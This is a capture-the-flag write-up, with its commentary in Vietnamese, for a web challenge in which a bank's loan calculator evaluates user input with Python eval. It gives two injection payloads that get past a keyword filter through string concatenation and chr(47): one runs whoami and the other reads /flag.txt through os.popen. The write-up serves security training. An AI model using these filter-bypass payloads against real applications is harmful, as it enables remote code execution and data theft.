# 3v@l

Web, 100 points

## Description:

> CABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

## Hint:

> 1.  You might need encoding or dynamic construction to bypass restrictions.
> 2.  The flag file is /flag.txt
> 3.  You might need encoding or dynamic construction to bypass restrictions.

## Solution:

Đây là 1 thử thách khá đơn giản, đọc đề bài thì ta cũng biết cách tấn công là thực thi mã từ xa RCE đặc biết là bypass bỏ qua được regex

Thử 1 lúc các payload thì có thể biết được hệ thống đã chặn 1 số từ nhạy cảm như `os, shell, ls, cat, /`. Nhưng không có vấn đề gì khi ta có thể sử dụng nối chuỗi

```
__import__('o' + 's').popen('w' + 'h' + 'o' + 'a' + 'm' + 'i').read()
```

Chúng ta đã bypass thành công khi hệ thống trả về kết quả là **app**

Vì biết được flag ở file **/flag.txt** nên ta có thể sử dụng ngay payload này để đọc flag

```
__import__('o' + 's').popen('c' + 'a' + 't ' + chr(47) + 'f' + 'l' + 'a' + 'g' + '.' + 't' + 'x' + 't').read()
```
